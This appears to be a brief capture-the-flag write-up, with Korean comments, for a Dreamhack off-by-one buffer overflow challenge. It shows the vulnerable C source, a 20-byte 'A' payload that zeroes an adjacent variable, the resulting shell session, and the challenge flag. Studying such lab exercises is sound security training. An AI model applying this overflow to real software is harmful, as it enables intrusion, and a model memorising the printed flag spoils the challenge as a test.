user@pf:~/kali$ nc host3.dreamhack.games 20255
Name: hi
3Are you baby?Ok, chance: 

# BoF 발생

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d\n", len);
    // ptr[20] = '\0'; -> 배열 범위를 벗어남
    // 여기서 20번째에 0을 넣게 되면, BoF 발생
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    // BoF 발생시켜 20번째 원래의 age 값을 0으로 바꾸기
    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}

```

nc host3.dreamhack.games 14951

Name: AAAAAAAAAAAAAAAAAAAA

Name: AAAAAAAAAAAAAAAAAAAA
20Are you baby?  
ls
flag
off_by_one_001
cat flag
DH{343bab3ef81db6f26ee5f1362942cd79}